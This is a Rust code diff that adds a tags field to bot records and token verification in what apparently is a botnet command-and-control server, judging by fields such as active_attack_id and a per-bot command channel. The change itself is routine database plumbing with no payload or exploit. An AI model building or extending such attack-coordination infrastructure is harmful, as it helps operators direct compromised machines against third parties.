@@ -28,9 +28,10 @@ pub struct BotInfo {
     pub is_alive: bool,
     pub active_attack_id: Option<usize>,
     pub last_error: Option<String>,
+    pub tags: Vec<String>,
 }
 impl BotInfo {
-    pub fn new(ip: SocketAddr, arch: String, version: String) -> Self {
+    pub fn new(ip: SocketAddr, arch: String, version: String, tags: Vec<String>) -> Self {
         let now = Utc::now();
         Self {
             id: Uuid::new_v4(),
@@ -42,6 +43,7 @@ impl BotInfo {
             is_alive: true,
             active_attack_id: None,
             last_error: None,
+            tags,
         }
     }
     pub fn update_last_seen(&mut self) {
@@ -56,9 +58,9 @@ pub struct Bot {
     pub cmd_tx: tokio::sync::mpsc::Sender<String>,
 }
 impl Bot {
-    pub fn new(addr: SocketAddr, arch: String, version: String, cmd_tx: tokio::sync::mpsc::Sender<String>) -> Self {
+    pub fn new(addr: SocketAddr, arch: String, version: String, tags: Vec<String>, cmd_tx: tokio::sync::mpsc::Sender<String>) -> Self {
         Self {
-            info: Arc::new(Mutex::new(BotInfo::new(addr, arch, version))),
+            info: Arc::new(Mutex::new(BotInfo::new(addr, arch, version, tags))),
             cmd_tx,
         }
     }
@@ -88,26 +90,30 @@ impl BotManager {
         let token = generate_secure_token(64);  
         let token_hash = Self::hash_token(&token);
         let now = Utc::now();
-        sqlx::query("INSERT INTO bot_tokens (token_hash, bot_id, arch, created_at) VALUES (?, ?, ?, ?)")
+        sqlx::query("INSERT INTO bot_tokens (token_hash, bot_id, arch, created_at, tags) VALUES (?, ?, ?, ?, ?)")
             .bind(&token_hash)
             .bind(bot_id.to_string())
             .bind(&arch)
             .bind(now)
+            .bind("")
             .execute(&self.pool)
             .await
             .map_err(|e| format!("Database error: {}", e))?;
         info!("Registered new bot {} - TOKEN WILL BE SHOWN ONLY ONCE!", bot_id);
         Ok((bot_id, token))
     }
-    pub async fn verify_bot_token(&self, token: &str) -> Option<(Uuid, String)> {
+    pub async fn verify_bot_token(&self, token: &str) -> Option<(Uuid, String, Vec<String>)> {
         let token_hash = Self::hash_token(token);
-        let row = sqlx::query("SELECT bot_id, arch FROM bot_tokens WHERE token_hash = ?")
+        let row = sqlx::query("SELECT bot_id, arch, tags FROM bot_tokens WHERE token_hash = ?")
             .bind(&token_hash)
             .fetch_optional(&self.pool)
             .await
             .ok()??;
         let bot_id_str: String = row.get("bot_id");
         let arch: String = row.get("arch");
+        let tags_str: String = row.get("tags");
+        let tags = tags_str.split(',').map(|s| s.trim().to_string()).filter(|s| !s.is_empty()).collect();
+
         let bot_id = Uuid::parse_str(&bot_id_str).ok()?;
         if let Err(e) = sqlx::query("UPDATE bot_tokens SET last_used_at = ? WHERE token_hash = ?")
             .bind(Utc::now())
@@ -117,7 +123,7 @@ impl BotManager {
         {
             error!("Failed to update last_used_at for bot token: {}", e);
         }
-        Some((bot_id, arch))
+        Some((bot_id, arch, tags))
     }
     pub async fn revoke_token(&self, bot_id: Uuid) -> Result<(), String> {
         let result = sqlx::query("DELETE FROM bot_tokens WHERE bot_id = ?")
